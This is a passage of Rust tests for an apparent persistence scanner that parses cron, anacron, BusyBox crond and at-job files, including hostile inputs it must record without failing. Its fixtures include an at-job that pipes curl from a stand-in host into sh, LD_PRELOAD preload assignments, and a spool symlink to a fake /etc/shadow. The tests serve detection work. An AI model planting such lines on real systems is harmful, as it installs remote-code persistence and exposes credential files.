        s.entries.iter().find(|e| e.name == name).unwrap_or_else(|| panic!("no entry named {name:?}"))
    }

    /// An Alpine-shaped host: BusyBox behind crond and run-parts.
    fn busybox_host(dir: &Path) {
        put(dir, "bin/busybox", b"\x7fELF BusyBox v1.37.0 multi-call binary");
        for at in ["usr/sbin/crond", "bin/run-parts"] {
            std::fs::create_dir_all(dir.join(at).parent().unwrap()).unwrap();
            std::os::unix::fs::symlink("/bin/busybox", dir.join(at)).unwrap();
        }
        put(dir, "etc/passwd", b"root:x:0:0:root:/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n");
    }

    #[test]
    fn a_run_parts_directory_no_job_names_runs_nothing_and_a_dangling_link_in_one_is_off() {
        let dir = tree("gate");
        for period in ["daily", "weekly"] {
            put(&dir, &format!("etc/cron.{period}/job"), b"#!/bin/sh\n");
            chmod(&dir, &format!("etc/cron.{period}/job"), 0o755);
        }
        std::os::unix::fs::symlink("/nowhere/at/all", dir.join("etc/cron.daily/dangling")).unwrap();
        // The crontab points run-parts at daily only.
        put(&dir, "etc/crontab", b"25 6 * * * root run-parts /etc/cron.daily\n");
        let s = scan(&dir);
        let of = |period: &str, name: &str| {
            s.entries.iter().find(|e| e.name == name && e.raw.get("schedule").is_some_and(|p| p == &format!("@{period}"))).unwrap()
        };
        assert_eq!(of("daily", "job").enabled, Enablement::Enabled);
        assert_eq!(of("weekly", "job").enabled, Enablement::Disabled);
        assert!(of("weekly", "job").raw["not_run"].contains("no loaded crontab line"));
        let dangling = of("daily", "dangling");
        assert_eq!((dangling.enabled, dangling.raw["not_run"].as_str()), (Enablement::Disabled, "a link to nothing"));
        // An anacron job that runs it counts too.
        put(&dir, "etc/anacrontab", b"7 10 cron.weekly nice run-parts /etc/cron.weekly\n");
        assert_eq!(scan_named(&dir, "weekly", "job"), Enablement::Enabled);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    fn scan_named(dir: &Path, period: &str, name: &str) -> Enablement {
        let s = scan(dir);
        s.entries.iter().find(|e| e.name == name && e.raw.get("schedule").is_some_and(|p| p == &format!("@{period}"))).unwrap().enabled
    }

    #[test]
    fn each_cron_reads_from_etc_cron_d_only_the_names_it_was_seen_to() {
        // The daemon says which cron this is; what follows is what each was
        // seen to run when files of these names were dropped in.
        let names = ["plain", "UPPER_ok-1", "dot.sh", ".hidden", "tilde~", "x.conf", "x.rpmsave", "x.rpmorig", "x.rpmnew", "#x", "a,b"];
        let read = |daemon: &str| -> BTreeMap<String, bool> {
            let dir = tree(&format!("crond-{}", daemon.replace('/', "-")));
            put(&dir, daemon, b"ELF");
            for n in names {
                put(&dir, &format!("etc/cron.d/{n}"), b"* * * * * root /usr/bin/touch /tmp/x\n");
            }
            let s = scan(&dir);
            std::fs::remove_dir_all(&dir).unwrap();
            s.entries.iter().map(|e| (e.source.file_name().unwrap().to_string_lossy().into_owned(), e.enabled == Enablement::Enabled)).collect()
        };
        let debian = read("usr/sbin/cron");
        let ran = |m: &BTreeMap<String, bool>| -> Vec<String> { m.iter().filter(|(_, on)| **on).map(|(n, _)| n.clone()).collect() };
        assert_eq!(ran(&debian), ["UPPER_ok-1", "plain"]);
        let cronie = read("usr/sbin/crond");
        assert_eq!(ran(&cronie), ["UPPER_ok-1", "a,b", "dot.sh", "plain", "x.conf"]);
        // No daemon to say: nothing is claimed about the names.
        let unknown = tree("crond-unknown");
        for n in names {
            put(&unknown, &format!("etc/cron.d/{n}"), b"* * * * * root /usr/bin/touch /tmp/x\n");
        }
        assert!(scan(&unknown).entries.iter().all(|e| e.enabled == Enablement::Enabled));
        std::fs::remove_dir_all(&unknown).unwrap();
    }

    #[test]
    fn busybox_crond_reads_its_directory_by_config_reads_rule() {
        let dir = tree("busybox");
        busybox_host(&dir);
        put(&dir, "etc/conf.d/crond", b"# options\nCRON_OPTS=\"-c /etc/crontabs\"\n");
        put(
            &dir,
            "etc/crontabs/root",
            b"# root's\nMAILTO=admin@x extra\nPATH=/usr/bin:/bin\n*/15 * * * *   run-parts /etc/periodic/15min # hi\n@reboot /opt/agent --x # keep\n@bogus /opt/x\n* * * * *\n0 2 * * * /opt/a \\\n  --b\n0 3 * * * echo a%b\n",
        );
        put(&dir, "etc/crontabs/alice", b"1 2 3 4 5 /opt/alice\n");
        put(&dir, "etc/crontabs/nobodyhere", b"1 2 3 4 5 /opt/ghost\n");
        put(&dir, "etc/crontab", b"1 1 * * * root /opt/system\n");
        put(&dir, "etc/cron.d/job", b"1 1 * * * root /opt/cron-d\n");
        for f in ["etc/periodic/15min/job", "etc/periodic/15min/backup.sh", "etc/periodic/15min/.hidden", "etc/periodic/daily/orphan"] {
            put(&dir, f, b"#!/bin/sh\n");
            chmod(&dir, f, 0o755);
        }
        let s = scan(&dir);
        assert!(matches!(s.header.collectors[0].status, Status::Complete), "{:?}", s.header.collectors[0].status);

        let parts = find(&s, "run-parts /etc/periodic/15min");
        assert_eq!(text(parts), "run-parts /etc/periodic/15min", "a # ends the line; blanks before it are trimmed");
        assert_eq!(parts.raw["schedule"], "*/15 * * * *");
        assert_eq!(parts.raw["crond"], "busybox");
        assert_eq!(parts.raw["env.PATH"], "/usr/bin:/bin");
        assert_eq!(parts.raw["env.MAILTO"], "admin@x", "a setting is its first token alone");
        assert_eq!(parts.principal.as_deref(), Some("root"));
        // The fixture is owned by whoever runs the tests, and crond loads
        // only root's files.
        assert_eq!(parts.enabled, Enablement::Disabled);
        assert!(parts.raw["not_run"].starts_with("crond loads only files owned by root"), "{}", parts.raw["not_run"]);

        let agent = find(&s, "/opt/agent");
        assert_eq!((text(agent).as_str(), agent.trigger), ("/opt/agent --x # keep", Trigger::Boot), "an @ line keeps its # tail");
        assert!(find(&s, "@bogus").raw["parse_error"].starts_with("crond knows @reboot"));
        assert_eq!(find(&s, "* * * * *").raw["parse_error"], "fewer than six fields; crond skips the line");
        assert_eq!(text(find(&s, "--b")), "/opt/a   --b", "a backslash joins the next line");
        let percent = find(&s, "echo a%b");
        assert_eq!(text(percent), "echo a%b");
        assert!(!percent.raw.contains_key("stdin"), "BusyBox has no %");

        assert_eq!(find(&s, "/opt/alice").principal.as_deref(), Some("alice"));
        assert_eq!(find(&s, "/opt/ghost").raw["not_run"], "crond ignores a crontab named for no account (nobodyhere)");
        for planted in ["/opt/system", "/opt/cron-d"] {
            let e = find(&s, planted);
            assert_eq!((e.enabled, e.raw["not_run"].as_str()), (Enablement::Disabled, "BusyBox crond reads only its crontab directory"), "{planted}");
        }

        let job = named(&s, "job");
        assert_eq!(job.raw["schedule"], "@15min");
        assert_eq!(job.raw["not_run"], "no loaded crontab line runs run-parts on this directory", "root's line did not load");
        assert!(!named(&s, "backup.sh").raw["not_run"].contains("names"), "BusyBox's run-parts allows a dot");
        assert_eq!(named(&s, ".hidden").enabled, Enablement::Disabled);
        assert_eq!(named(&s, "orphan").enabled, Enablement::Disabled);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn periodic_scripts_run_when_a_loaded_crontab_line_names_them() {
        let dir = tree("periodic");
        put(&dir, "etc/crontab", b"*/15 * * * * root run-parts /etc/periodic/15min\n");
        for f in ["etc/periodic/15min/job", "etc/periodic/15min/backup.sh", "etc/periodic/daily/orphan"] {
            put(&dir, f, b"#!/bin/sh\n");
            chmod(&dir, f, 0o755);
        }
        let s = scan(&dir);
        let job = named(&s, "job");
        assert_eq!(job.enabled, Enablement::Enabled);
        assert_eq!(job.raw["run_by"], format!("a crontab line in {}", dir.join("etc/crontab").display()));
        assert_eq!(job.target_path, Some(dir.join("etc/periodic/15min/job")));
        let backup = named(&s, "backup.sh");
        assert_eq!((backup.enabled, backup.raw["not_run"].as_str()), (Enablement::Disabled, "run-parts runs only names of letters, digits, _ and -"), "Debian's run-parts here");
        assert_eq!(named(&s, "orphan").raw["not_run"], "no loaded crontab line runs run-parts on this directory");
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn busybox_run_parts_allows_a_dot_after_the_first_character() {
        let dir = tree("bb-run-parts");
        busybox_host(&dir);
        for f in ["etc/cron.daily/backup.sh", "etc/cron.daily/.x", "etc/cron.daily/ok-1_2"] {
            put(&dir, f, b"#!/bin/sh\n");
            chmod(&dir, f, 0o755);
        }
        let s = scan(&dir);
        // Nothing here names the directory (and the fixture is not root's), so
        // it is the name rule alone that is read from what each says.
        let says = |n: &str| named(&s, n).raw["not_run"].clone();
        assert!(!says("backup.sh").contains("names of"), "a dot after the first character is allowed: {}", says("backup.sh"));
        assert!(!says("ok-1_2").contains("names of"));
        assert_eq!(says(".x"), "run-parts runs only names of letters, digits, _, - and dots after the first character");
        assert!(s.header.collectors[0].truncated.is_empty(), "reading the binary is not a limited read: {:?}", s.header.collectors[0].truncated);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn system_crontab_carries_user_schedule_and_command() {
        let dir = tree("system");
        put(&dir, "etc/crontab", b"# /etc/crontab: the system-wide crontab\nMAILTO=\"\"\nPATH=/usr/local/bin:/usr/bin\n\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly # keep me\n@reboot root LD_PRELOAD=/tmp/e.so /usr/bin/agent\n30 4 * * 1-5 backup /usr/local/bin/dump%first line of input\n0 0 * * * root echo 100\\% done%mail body\n");
        let s = scan(&dir);
        assert_eq!(s.entries.len(), 4, "four job lines, and neither the comment nor the assignments");

        let hourly = find(&s, "run-parts");
        assert_eq!(hourly.kind, Kind::Cron);
        assert_eq!(hourly.principal.as_deref(), Some("root"));
        assert_eq!(hourly.trigger, Trigger::Schedule);
        assert_eq!(hourly.raw["schedule"], "17 *\t* * *");
        assert_eq!(text(hourly), "cd / && run-parts --report /etc/cron.hourly # keep me", "a # inside the command is part of it");
        assert_eq!(hourly.target_path, None, "cd is not a path");
        assert_eq!(hourly.raw["env.PATH"], "/usr/local/bin:/usr/bin");
        assert_eq!(hourly.raw["env.MAILTO"], "", "a quoted empty value is still an assignment");

        let boot = find(&s, "/usr/bin/agent");
        assert_eq!(boot.trigger, Trigger::Boot, "@reboot fires at boot, not on a schedule");
        assert_eq!(boot.raw["schedule"], "@reboot");
        assert_eq!(boot.principal.as_deref(), Some("root"));
        assert_eq!(boot.raw["env.LD_PRELOAD"], "/tmp/e.so", "an assignment on the command line is still an assignment");
        assert_eq!(boot.target_path, Some(PathBuf::from("/usr/bin/agent")), "the preload assignment is not the program");

        let dump = find(&s, "/usr/local/bin/dump");
        assert_eq!(text(dump), "/usr/local/bin/dump", "the command ends at the first unescaped %");
        assert_eq!(dump.raw["stdin"], "first line of input");
        assert_eq!(dump.principal.as_deref(), Some("backup"));

        let escaped = find(&s, "echo 100");
        assert_eq!(text(escaped), "echo 100\\% done", "a backslash-escaped % does not end the command");
        assert_eq!(escaped.raw["stdin"], "mail body");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn inserting_a_line_does_not_reidentify_the_ones_below_it() {
        let dir = tree("insert");
        put(&dir, "etc/crontab", b"0 1 * * * root /a\n0 2 * * * root /b\n");
        let before: Vec<String> = scan(&dir).entries.iter().map(|e| e.id.clone()).collect();
        assert_eq!(before.len(), 2);

        put(&dir, "etc/crontab", b"@reboot root /new\n0 1 * * * root /a\n0  2  *  *  *  root /b\n");
        let after: Vec<String> = scan(&dir).entries.iter().map(|e| e.id.clone()).collect();
        assert_eq!(after.len(), 3);
        for id in &before {
            assert!(after.contains(id), "a line moved down the file and lost its identity");
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn two_identical_lines_are_two_entries_with_two_ids() {
        let dir = tree("dup");
        put(&dir, "etc/cron.d/twice", b"* * * * * root /bin/x\n* * * * * root /bin/x\n");
        let s = scan(&dir);
        assert_eq!(s.entries.len(), 2);
        assert_ne!(s.entries[0].id, s.entries[1].id, "a duplicate id would silently drop one of them");
        assert!(s.entries.iter().any(|e| e.raw.get("duplicate_line").map(String::as_str) == Some("2")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_input_is_recorded_rather_than_fatal() {
        let dir = tree("hostile");
        put(&dir, "etc/shadow", b"root:$6$notreal$hash:19000:0:99999:7:::\n");
        std::fs::create_dir_all(dir.join("var/spool/cron/crontabs")).unwrap();
        std::os::unix::fs::symlink("/etc/shadow", dir.join("var/spool/cron/crontabs/victim")).unwrap();
        std::fs::create_dir_all(dir.join("etc/cron.d/adir")).unwrap();

        // Anything past the read cap exercises the same path as the 10 MB
        // line this stands in for, without the 10 MB.
        let mut huge = b"* * * * * root /bin/x ".to_vec();
        huge.extend(std::iter::repeat_n(b'A', 2 * crate::root::READ_CAP));
        put(&dir, "etc/cron.d/huge", &huge);

        put(&dir, "etc/crontab", b"* * * * * root /bin/ev\x00il\r\n* * * * * root /bin/\xff\xfe\r\n* * *\r\n@nosuch root /bin/y\r\n");

        let s = scan(&dir);
        let status = &s.header.collectors[0].status;
        assert!(!matches!(status, Status::Failed { .. }), "hostile input must not take the collector out: {status:?}");

        let report = serde_json::to_string(&s.entries).unwrap();
        assert!(!report.contains("notreal"), "a spool symlink was followed into the shadow file");
        assert!(s.entries.iter().any(|e| e.raw.get("parse_error").is_some_and(|p| p.contains("symlink"))));

        assert!(s.entries.iter().any(|e| e.raw.contains_key("command_nul")), "an embedded NUL must be reported");
        assert!(s.entries.iter().any(|e| e.has_flag(Flag::EncodingAnomaly)), "invalid UTF-8 in a command is evidence");
        assert_eq!(
            s.entries.iter().filter(|e| e.raw.get("parse_error").is_some_and(|p| p.starts_with("neither"))).count(),
            2,
            "the short line and the unknown @shortcut are both reported, not dropped"
        );
        assert!(s.entries.iter().filter(|e| e.source.ends_with("crontab")).all(|e| e.raw["line_ending"] == "crlf"));

        let truncated = s.header.collectors[0].truncated.join("\n");
        assert!(truncated.contains("read to"), "the 10 MB line is capped and said so: {truncated}");
        // A directory planted where a crontab belongs is reported, but it
        // does not demote the collector: an attacker must not be able to
        // declare the whole baseline incomparable by creating one.
        assert!(truncated.contains("adir"), "a crontab that is a directory is reported: {truncated}");
        assert!(
            !matches!(status, Status::Failed { .. }),
            "hostile input must not kill the collector: {status:?}"
        );
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn run_parts_scripts_spool_crontabs_and_anacron() {
        let dir = tree("dirs");
        put(&dir, "etc/cron.daily/backup", b"#!/bin/sh\n/usr/local/bin/backup\n");
        chmod(&dir, "etc/cron.daily/backup", 0o755);
        put(&dir, "etc/cron.daily/backup.dpkg-old", b"#!/bin/sh\n");
        chmod(&dir, "etc/cron.daily/backup.dpkg-old", 0o644);
        put(&dir, "var/spool/cron/crontabs/alice", b"MAILTO=alice\n*/5 * * * * /usr/bin/x\n");
        put(&dir, "etc/anacrontab", b"START_HOURS_RANGE=3-22\n1 5 cron.daily run-parts --report /etc/cron.daily\n@monthly 30 clean /tmp/x\n");
        let s = scan(&dir);

        let script = named(&s, "backup");
        assert_eq!(script.command, None, "a run-parts script has no parseable command line");
        assert_eq!(script.target_path, Some(dir.join("etc/cron.daily/backup")));
        assert_eq!(script.principal.as_deref(), Some("root"));
        assert_eq!(script.raw["schedule"], "@daily", "the schedule comes from the directory");
        assert_eq!(script.enabled, Enablement::Enabled);
        assert_eq!(named(&s, "backup.dpkg-old").enabled, Enablement::Disabled, "run-parts skips what is not executable");

        let alice = find(&s, "/usr/bin/x");
        assert_eq!(alice.principal.as_deref(), Some("alice"), "a spool crontab takes its user from the filename");
        assert_eq!(alice.raw["schedule"], "*/5 * * * *", "five fields, no user field");
        assert_eq!(alice.raw["env.MAILTO"], "alice");

        let daily = named(&s, "cron.daily");
        assert_eq!(text(daily), "run-parts --report /etc/cron.daily");
        assert_eq!(daily.raw["schedule"], "1");
        assert_eq!(daily.raw["delay_minutes"], "5");
        assert_eq!(daily.principal.as_deref(), Some("root"));
        assert_eq!(daily.raw["env.START_HOURS_RANGE"], "3-22");
        assert_eq!(named(&s, "clean").target_path, Some(PathBuf::from("/tmp/x")));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn at_job_body_survives_the_generated_header() {
        let dir = tree("at");
        put(&dir, "etc/passwd", b"alice:x:1000:1000::/home/alice:/bin/bash\n");
        put(&dir, "var/spool/cron/atjobs/a0000101234567", b"#!/bin/sh\n# atrun uid=1000 gid=1000\n# mail alice 0\numask 22\nPATH=/usr/bin:/bin; export PATH\nLD_PRELOAD=/tmp/e.so; export LD_PRELOAD\ncd /home/alice || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 100\n}\n${SHELL:-/bin/sh} << 'marker'\n/usr/bin/curl http://x/y | sh\nmarker\n");
        put(&dir, "var/spool/cron/atjobs/.SEQ", b"0001\n");
        let s = scan(&dir);

        assert_eq!(s.entries.len(), 1, "atd's own .SEQ bookkeeping is not a job");
        let e = &s.entries[0];
        assert_eq!(e.kind, Kind::AtJob);
        assert_eq!(e.raw["queue"], "a");
        assert_eq!(e.raw["job_number"], "00001");
        assert_eq!(e.principal.as_deref(), Some("alice"), "the uid in the header names the account");
        assert_eq!(e.raw["env.LD_PRELOAD"], "/tmp/e.so", "the submitted environment is part of the job");
        assert_eq!(e.raw["env.PATH"], "/usr/bin:/bin");
        let body = text(e);
        assert!(body.starts_with("${SHELL:-/bin/sh}"), "the body starts below the generated header: {body:?}");
        assert!(body.contains("/usr/bin/curl http://x/y | sh"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn cron_directories_follow_the_hosts_run_parts() {
        let dir = tree("runparts");
        put(&dir, "etc/cron.daily/backup.sh", b"#!/bin/sh\n");
        chmod(&dir, "etc/cron.daily/backup.sh", 0o755);
        put(&dir, "etc/cron.daily/rotate", b"#!/bin/sh\n");
        chmod(&dir, "etc/cron.daily/rotate", 0o755);
        // The line that points run-parts at the directory, as Debian ships it.
        put(&dir, "etc/crontab", b"25 6 * * * root cd / && run-parts --report /etc/cron.daily\n");
        let s = scan(&dir);
        assert_eq!(named(&s, "backup.sh").enabled, Enablement::Disabled, "debianutils runs no dotted name");
        assert_eq!(named(&s, "rotate").enabled, Enablement::Enabled);

        put(&dir, "usr/bin/run-parts", b"#!/bin/bash\n");
        put(&dir, "etc/cron.daily/jobs.deny", b"rotate\n");
        let s = scan(&dir);
        assert_eq!(named(&s, "backup.sh").enabled, Enablement::Enabled, "Fedora's script does");
        assert_eq!(named(&s, "rotate").raw["not_run"], "named in jobs.deny");
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
